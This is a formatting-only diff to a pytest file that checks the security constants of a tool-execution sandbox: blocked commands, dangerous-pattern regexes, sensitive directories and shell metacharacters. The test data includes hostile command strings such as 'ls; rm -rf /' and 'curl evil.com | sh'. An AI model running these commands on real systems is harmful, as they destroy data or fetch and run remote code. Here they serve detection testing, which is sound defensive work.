@@ -6,16 +6,17 @@ the tool execution framework for validation and blocking dangerous operations.
 """
 
 import pytest
+
 from saber.server.execution.utils.security_constants import (
+    ALLOWED_CONTROL_CHARS,
     BLOCKED_COMMANDS,
     DANGEROUS_PATTERNS,
-    SENSITIVE_DIRECTORIES,
-    SUSPICIOUS_EXTENSIONS,
     DEFAULT_SECURITY_SETTINGS,
-    ALLOWED_CONTROL_CHARS,
-    SHELL_METACHARACTERS_PATTERN,
     MIN_CONTROL_CHAR_CODE,
     NULL_BYTE,
+    SENSITIVE_DIRECTORIES,
+    SHELL_METACHARACTERS_PATTERN,
+    SUSPICIOUS_EXTENSIONS,
 )
 
 
@@ -25,14 +26,24 @@ class TestSecurityConstants:
     def test_blocked_commands_completeness(self):
         """Test that blocked commands include critical dangerous commands."""
         critical_commands = [
-            "sudo", "su", "doas",  # Privilege escalation
-            "rm", "mv", "cp",      # File operations
-            "chmod", "chown",      # Permission changes
-            "passwd", "adduser",   # User management
-            "iptables", "ufw",     # Firewall
-            "systemctl", "service", # Service management
-            "python", "python3",   # Interpreters
-            "docker", "kubectl",   # Container tools
+            "sudo",
+            "su",
+            "doas",  # Privilege escalation
+            "rm",
+            "mv",
+            "cp",  # File operations
+            "chmod",
+            "chown",  # Permission changes
+            "passwd",
+            "adduser",  # User management
+            "iptables",
+            "ufw",  # Firewall
+            "systemctl",
+            "service",  # Service management
+            "python",
+            "python3",  # Interpreters
+            "docker",
+            "kubectl",  # Container tools
         ]
 
         for cmd in critical_commands:
@@ -45,22 +56,22 @@ class TestSecurityConstants:
     def test_dangerous_patterns_completeness(self):
         """Test that dangerous patterns cover common attack vectors."""
         test_strings = [
-            "ls; rm -rf /",           # Command injection
-            "cat file | sh",          # Pipe to shell
-            "echo $(whoami)",         # Command substitution
-            "cat `id`",              # Backtick substitution
-            "ls > /etc/passwd",       # Redirect to sensitive
-            "curl evil.com | sh",     # Download and execute
-            "rm -rf /tmp",           # Dangerous rm
-            "chmod 777 file",        # Dangerous permissions
-            "sudo command",          # Privilege escalation
-            "kill -9 pid",           # Force kill
+            "ls; rm -rf /",  # Command injection
+            "cat file | sh",  # Pipe to shell
+            "echo $(whoami)",  # Command substitution
+            "cat `id`",  # Backtick substitution
+            "ls > /etc/passwd",  # Redirect to sensitive
+            "curl evil.com | sh",  # Download and execute
+            "rm -rf /tmp",  # Dangerous rm
+            "chmod 777 file",  # Dangerous permissions
+            "sudo command",  # Privilege escalation
+            "kill -9 pid",  # Force kill
         ]
 
         import re
+
         for test_string in test_strings:
-            matched = any(re.search(pattern, test_string, re.IGNORECASE)
-                         for pattern in DANGEROUS_PATTERNS)
+            matched = any(re.search(pattern, test_string, re.IGNORECASE) for pattern in DANGEROUS_PATTERNS)
             assert matched, f"Dangerous string should match a pattern: {test_string}"
 
     def test_dangerous_patterns_type(self):
@@ -73,8 +84,7 @@ class TestSecurityConstants:
         critical_dirs = ["/etc", "/root", "/sys", "/proc"]
 
         for critical_dir in critical_dirs:
-            assert critical_dir in SENSITIVE_DIRECTORIES, \
-                f"Critical directory '{critical_dir}' should be protected"
+            assert critical_dir in SENSITIVE_DIRECTORIES, f"Critical directory '{critical_dir}' should be protected"
 
     def test_sensitive_directories_type(self):
         """Test that sensitive directories is a list."""
@@ -86,8 +96,7 @@ class TestSecurityConstants:
         executable_extensions = [".sh", ".py", ".exe", ".bat"]
 
         for ext in executable_extensions:
-            assert ext in SUSPICIOUS_EXTENSIONS, \
-                f"Executable extension '{ext}' should be flagged as suspicious"
+            assert ext in SUSPICIOUS_EXTENSIONS, f"Executable extension '{ext}' should be flagged as suspicious"
 
     def test_suspicious_extensions_type(self):
         """Test that suspicious extensions is a list."""
@@ -102,8 +111,7 @@ class TestSecurityConstants:
         ]
 
         for limit in required_limits:
-            assert limit in DEFAULT_SECURITY_SETTINGS, \
-                f"Required security limit '{limit}' is missing"
+            assert limit in DEFAULT_SECURITY_SETTINGS, f"Required security limit '{limit}' is missing"
 
     def test_default_security_limits_values(self):
         """Test that security limits have reasonable values."""
@@ -131,12 +139,12 @@ class TestSecurityConstants:
         safe_chars = ["a", "z", "0", "9", "-", "_", ".", "/", ";"]  # Semicolon now safe
 
         for char in dangerous_chars:
-            assert re.search(SHELL_METACHARACTERS_PATTERN, char), \
-                f"Dangerous character '{char}' should match pattern"
+            assert re.search(SHELL_METACHARACTERS_PATTERN, char), f"Dangerous character '{char}' should match pattern"
 
         for char in safe_chars:
-            assert not re.search(SHELL_METACHARACTERS_PATTERN, char), \
-                f"Safe character '{char}' should not match pattern"
+            assert not re.search(
+                SHELL_METACHARACTERS_PATTERN, char
+            ), f"Safe character '{char}' should not match pattern"
 
     def test_min_control_char_code(self):
         """Test that minimum control character code is set correctly."""
@@ -173,8 +181,7 @@ class TestSecurityConstants:
             # Find pattern in DANGEROUS_PATTERNS that contains our test pattern
             matching_patterns = [p for p in DANGEROUS_PATTERNS if pattern in p]
             if matching_patterns:
-                found_match = any(re.search(p, test_string, re.IGNORECASE)
-                                for p in matching_patterns)
+                found_match = any(re.search(p, test_string, re.IGNORECASE) for p in matching_patterns)
                 assert found_match, f"Pattern should match case-insensitive: {test_string}"
 
     def test_security_limits_consistency(self):
